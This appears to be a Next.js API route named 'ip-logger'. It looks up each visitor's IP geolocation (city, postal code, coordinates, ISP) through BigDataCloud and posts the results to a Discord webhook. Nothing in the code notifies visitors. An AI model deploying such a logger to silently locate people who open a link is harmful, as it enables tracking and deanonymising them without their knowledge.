// /pages/api/ip-logger.js

export default async function handler(req, res) {
  // --------------------
  // CORS
  // --------------------
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(200).end();

  try {
    // --------------------
    // CLIENT IP + UA
    // --------------------
    let clientIP =
      req.headers['x-forwarded-for'] ||
      req.headers['x-real-ip'] ||
      req.socket?.remoteAddress ||
      '';

    if (clientIP.includes(',')) clientIP = clientIP.split(',')[0].trim();
    clientIP = clientIP.replace(/^::ffff:/, '');

    const userAgent = req.headers['user-agent'] || 'Unknown';

    // --------------------
    // API CONFIG
    // --------------------
    const API_KEY = process.env.BIGDATACLOUD_API_KEY;
    if (!API_KEY) {
      return res.status(500).json({ success: false, error: 'Missing API key' });
    }

    const BASE = 'https://api-bdc.net/data';
    const GEO_URL = `${BASE}/ip-geolocation-full?ip=${encodeURIComponent(
      clientIP
    )}&localityLanguage=en&key=${API_KEY}`;

    // --------------------
    // FETCH GEO DATA
    // --------------------
    const geoRes = await fetch(GEO_URL);
    if (!geoRes.ok) throw new Error('BigDataCloud request failed');

    const ipData = await geoRes.json();

    // --------------------
    // DETECT BOT / CLOUD
    // --------------------
    const isBot = /bot|crawler|spider|preview|screenshot|vercel/i.test(
      userAgent
    );

    const org =
      ipData?.network?.organisation ||
      ipData?.organisation ||
      ipData?.asnOrganisation ||
      'Unknown';

    const isDatacenter = /vercel|digitalocean|amazon|google|cloudflare|azure/i.test(
      org.toLowerCase()
    );

    // --------------------
    // COORDINATES
    // --------------------
    const latitude =
      ipData?.location?.latitude ?? ipData?.latitude ?? null;
    const longitude =
      ipData?.location?.longitude ?? ipData?.longitude ?? null;

    // --------------------
    // TIMEZONE
    // --------------------
    let timezone = {};
    if (latitude && longitude) {
      try {
        const tzRes = await fetch(
          `${BASE}/timezone-by-location?latitude=${latitude}&longitude=${longitude}&key=${API_KEY}`
        );
        if (tzRes.ok) timezone = await tzRes.json();
      } catch {}
    }

    // --------------------
    // CONFIDENCE / ACCURACY
    // --------------------
    let confidence =
      ipData?.confidence ||
      ipData?.location?.confidence ||
      'unknown';

    let accuracyRadius =
      ipData?.location?.accuracyRadius ||
      ipData?.accuracyRadius ||
      null;

    // 🚨 DO NOT SHOW FAKE ACCURACY FOR CLOUD IPs
    if (isDatacenter) {
      confidence = 'low';
      accuracyRadius = null;
    }

    // --------------------
    // STRUCTURED RESPONSE
    // --------------------
    const structuredData = {
      ip: clientIP,
      timestamp: new Date().toISOString(),

      location: {
        city: ipData?.location?.city || 'Unknown',
        region:
          ipData?.location?.region ||
          ipData?.principalSubdivision ||
          'Unknown',
        country:
          ipData?.country?.name || 'Unknown',
        countryCode:
          ipData?.country?.isoAlpha2 || 'Unknown',
        continent:
          ipData?.continent?.name || 'Unknown',
        postalCode:
          ipData?.location?.postalCode || 'Unknown',
        latitude,
        longitude,
        accuracyRadius,
        confidence
      },

      network: {
        isp:
          ipData?.network?.carrier?.name ||
          ipData?.isp ||
          'Unknown',
        organization: org,
        asn:
          ipData?.network?.autonomousSystemNumber ||
          ipData?.asn ||
          (ipData?.asnNumeric
            ? `AS${ipData.asnNumeric}`
            : 'Unknown'),
        connectionType:
          ipData?.network?.connectionType || 'Unknown'
      },

      timezone: {
        name: timezone?.ianaTimeZone || 'Unknown',
        localTime:
          timezone?.localTime || new Date().toISOString(),
        gmtOffset:
          timezone?.gmtOffsetString || '+00:00'
      },

      device: parseUserAgent(userAgent),

      metadata: {
        trafficType: isDatacenter
          ? 'cloud / proxy'
          : 'residential',
        isBot,
        isDatacenter
      }
    };

    // --------------------
    // DISCORD WEBHOOK
    // --------------------
    if (process.env.DISCORD_WEBHOOK_URL) {
      sendToDiscord(structuredData).catch(() => {});
    }

    // --------------------
    // RESPONSE
    // --------------------
    res.status(200).json({
      success: true,
      data: structuredData
    });
  } catch (err) {
    res.status(500).json({
      success: false,
      error: err.message
    });
  }
}

// --------------------------------------------------
// HELPERS
// --------------------------------------------------

function parseUserAgent(ua) {
  let browser = 'Unknown';
  let os = 'Unknown';
  let device = 'Desktop';

  if (/edg/i.test(ua)) browser = 'Edge';
  else if (/chrome/i.test(ua)) browser = 'Chrome';
  else if (/firefox/i.test(ua)) browser = 'Firefox';
  else if (/safari/i.test(ua)) browser = 'Safari';

  if (/windows/i.test(ua)) os = 'Windows';
  else if (/mac/i.test(ua)) os = 'MacOS';
  else if (/android/i.test(ua)) os = 'Android';
  else if (/iphone|ipad/i.test(ua)) os = 'iOS';

  if (/mobile/i.test(ua)) device = 'Mobile';
  if (/tablet/i.test(ua)) device = 'Tablet';

  if (/bot|crawler|spider|preview|screenshot/i.test(ua)) {
    browser = 'Bot';
    os = 'Server';
    device = 'Bot';
  }

  return { browser, os, device, raw: ua };
}

async function sendToDiscord(data) {
  const webhook = process.env.DISCORD_WEBHOOK_URL;
  if (!webhook) return;

  const payload = {
    embeds: [
      {
        title: '🌐 Visitor Logged',
        color: 3447003,
        timestamp: data.timestamp,
        fields: [
          { name: 'IP', value: `\`${data.ip}\`` },
          {
            name: 'Location',
            value: `${data.location.city}, ${data.location.country}`
          },
          {
            name: 'Accuracy',
            value: data.location.accuracyRadius
              ? `${data.location.accuracyRadius} km`
              : 'N/A'
          },
          {
            name: 'Traffic',
            value: data.metadata.trafficType
          },
          {
            name: 'Network',
            value: data.network.organization
          },
          {
            name: 'Device',
            value: `${data.device.browser} / ${data.device.os}`
          }
        ]
      }
    ]
  };

  await fetch(webhook, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload)
  });
}
